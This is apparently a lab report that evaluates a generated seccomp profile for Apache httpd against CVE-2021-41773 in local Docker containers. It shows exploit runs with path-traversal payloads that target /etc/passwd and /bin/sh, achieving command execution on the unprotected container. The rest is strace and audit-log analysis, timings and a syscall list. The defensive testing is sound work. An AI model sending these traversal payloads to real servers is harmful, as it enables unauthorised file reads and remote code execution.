## Apache httpd – chestnut

### Preparation

_For the container with seccomp, we execute the file `/tmp/script.sh` which is extracting the system calls from the binary `httpd`, creating a seccomp-profile based on these detected system calls and subsequently applying the profile on the binary. Afterwards, the binary is automatically run._

```bash
docker exec -it http-chestnut-seccomp-container bash -c "source /Chestnut/Binalyzer/venv/bin/activate && /tmp/script.sh"
```

_For the container without seccomp, we just have to start it with following command:_

```bash
docker exec -it http-chestnut-normal-container "/opt/apache/bin/httpd"
```

### Conduct the exploits

First, we verify the IP addresses of the container, to ensure we target the right containers:

```
❯ docker ps
CONTAINER ID   IMAGE                      COMMAND       CREATED          STATUS          PORTS                                                                                  NAMES
74a0ff93c31a   http-chestnut-seccomp      "bash"        36 seconds ago   Up 35 seconds   0.0.0.0:8083->80/tcp, [::]:8083->80/tcp                                                http-chestnut-seccomp-container
c4bb89d13ae4   http-chestnut-normal       "bash"        36 seconds ago   Up 35 seconds   0.0.0.0:8084->80/tcp, [::]:8084->80/tcp
```

_Seccomp_:

The attack on the container with the applied seccomp profile fails:

```
❯ python3 exploit.py -u http://localhost:8083
[+] Executing payload http://localhost:8083/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
[!] http://localhost:8083 is not vulnerable to CVE-2021-41773

[+] Executing payload http://localhost:8083/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh
[!] http://localhost:8083 is not vulnerable to CVE-2021-41773
```

The attack on the container without the seccomp profile succeeds. We are able to run arbitrary commands:

```
❯ python3 exploit.py -u http://localhost:8084
[+] Executing payload http://localhost:8084/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
[!] http://localhost:8084 is not vulnerable to CVE-2021-41773

[+] Executing payload http://localhost:8084/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh
[!] http://localhost:8084 is vulnerable to Remote Code Execution attack (CVE-2021-41773)
[+] Response:
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

### Analysis

As the exploit worked on the container without the seccomp profile, only the one with the enforced profile will be analysed.

_strace output:_
When starting the container with the command `strace -f /opt/apache/bin/httpd` we are able to see that just before the process with the pid `605` was killed with the signal `SIGSYS`, the system call `getegid` was executed.

```
[pid   605] getcwd("/bin", 4096)        = 5
[pid   605] ioctl(0, TCGETS, 0x7ffe8c739680) = -1 ENOTTY (Inappropriate ioctl for device)
[pid   605] geteuid()                   = 1
[pid   605] getegid()                   = 108
[pid   605] +++ killed by SIGSYS (core dumped) +++
```

Further analysis on the host machine with the tool `ausearch` delievers us more insights.
As we can see, the syscall with the number 108 was indeed blocked by seccomp

```
❯ sudo ausearch -m seccomp --start today
----
time->Wed Apr 23 15:48:45 2025
type=SECCOMP msg=audit(1745416125.536:9961): auid=4294967295 uid=1 gid=1 ses=4294967295 pid=382689 comm="sh" exe="/bin/dash" sig=31 arch=c000003e syscall=108 compat=0 ip=0x73ea2f68d867 code=0x0
```

We verify that the system call number `108` maps to `getegid` with the `ausyscall` tool:

```
❯ ausyscall --dump | grep 108
108	getegid
```

The last thing we check is, if the system call number `108` was in the applied seccomp profile. The file `/Chestnut/ChestnutPatcher/policy__opt_apache_bin_httpd.json` shows no presence:

```json
{
  "version": 1,
  "syscalls": [
    0, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 19, 20, 21, 23, 24,
    28, 29, 30, 31, 32, 33, 35, 38, 39, 41, 42, 44, 45, 47, 48, 49, 50, 51, 52,
    54, 55, 56, 59, 60, 61, 62, 63, 64, 65, 66, 67, 72, 73, 74, 75, 78, 79, 80,
    82, 83, 84, 86, 87, 89, 90, 92, 93, 95, 96, 100, 102, 104, 105, 106, 107,
    110, 111, 112, 125, 128, 133, 142, 144, 147, 157, 158, 164, 186, 201, 202,
    229, 231, 232, 233, 234, 235, 257, 262, 288, 291, 292, 302, 318, 116, 22,
    43, 273, 116, 22, 43, 273, 95
  ]
}
```

## Appendix

### Analysis Time

The following shows the time needed to extract the system calls from 3 runs:

```
docker exec -it http-chestnut-seccomp-container bash -c "rm /Chestnut/Binalyzer/cached_results/*; source /Chestnut/Binalyzer/venv/bin/activate && cd /Chestnut/Binalyzer && time python3 /Chestnut/Binalyzer/filter.py /opt/apache/bin/httpd"
...
real	0m44.115s
user	0m42.072s
sys	0m1.782s

docker exec -it http-chestnut-seccomp-container bash -c "rm /Chestnut/Binalyzer/cached_results/*; source /Chestnut/Binalyzer/venv/bin/activate && cd /Chestnut/Binalyzer && time python3 /Chestnut/Binalyzer/filter.py /opt/apache/bin/httpd"
...
real	0m43.806s
user	0m42.204s
sys	0m1.376s

docker exec -it http-chestnut-seccomp-container bash -c "rm /Chestnut/Binalyzer/cached_results/*; source /Chestnut/Binalyzer/venv/bin/activate && cd /Chestnut/Binalyzer && time python3 /Chestnut/Binalyzer/filter.py /opt/apache/bin/httpd"
...
real	0m44.743s
user	0m43.175s
sys	0m1.337s
```

(44,115+43,806+44,743)/3=44,221

### Missing system calls

Following system calls are not detected by chestnut, but needed for the application to start successfully, therefore we added these five to the seccomp-profile `/tmp/app.json`:

- 22 (pipe)
- 43 (accept)
- 95 (umask)
- 116 (setgroups)
- 273 (set_robust_list)

```
sed -i '/"syscalls"/ s/\]/, 22, 43, 95, 116, 273]/' /Chestnut/ChestnutPatcher/policy__opt_apache_bin_httpd.json
```

### Number of syscalls

```bash
echo '{
  "version": 1,
  "syscalls": [
    0, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 19, 20, 21, 23, 24,
    28, 29, 30, 31, 32, 33, 35, 38, 39, 41, 42, 44, 45, 47, 48, 49, 50, 51, 52,
    54, 55, 56, 59, 60, 61, 62, 63, 64, 65, 66, 67, 72, 73, 74, 75, 78, 79, 80,
    82, 83, 84, 86, 87, 89, 90, 92, 93, 95, 96, 100, 102, 104, 105, 106, 107,
    110, 111, 112, 125, 128, 133, 142, 144, 147, 157, 158, 164, 186, 201, 202,
    229, 231, 232, 233, 234, 235, 257, 262, 288, 291, 292, 302, 318
  ]
}' | jq -r '.syscalls | length'
104
```
